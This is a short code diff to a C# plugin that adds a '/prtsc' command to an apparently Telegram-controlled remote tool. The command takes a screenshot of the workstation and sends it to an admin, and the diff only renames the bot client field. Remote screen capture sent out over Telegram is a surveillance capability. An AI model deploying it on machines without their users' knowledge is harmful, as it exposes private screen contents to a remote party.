@@ -8,13 +8,12 @@ namespace prtsc
 {
     public class DllMain : PluginBase
     {
-        private ITGBotClient _client;
+        private ITGBotClient _telegram;
         private readonly ScreenUtility _screenUtility;
 
         public DllMain()
         {
             base.Name = "/prtsc";
-            base.HasArguments = false;
             base.Description = "Get a screenshot of the workstation.";
 
             this._screenUtility = new ScreenUtility();
@@ -39,7 +38,7 @@ namespace prtsc
                 // reset position (important)
                 buffer.Position = 0;
 
-                this._client.SendPhotoBackToAdmin(buffer, fileName);
+                this._telegram.SendPhotoBackToAdmin(buffer, fileName);
             }
         }
 
@@ -50,7 +49,7 @@ namespace prtsc
 
         public override void Init(IDependencyService service)
         {
-            this._client = service.ResolveInstance<ITGBotClient>();
+            this._telegram = service.ResolveInstance<ITGBotClient>();
         }
     }
 }
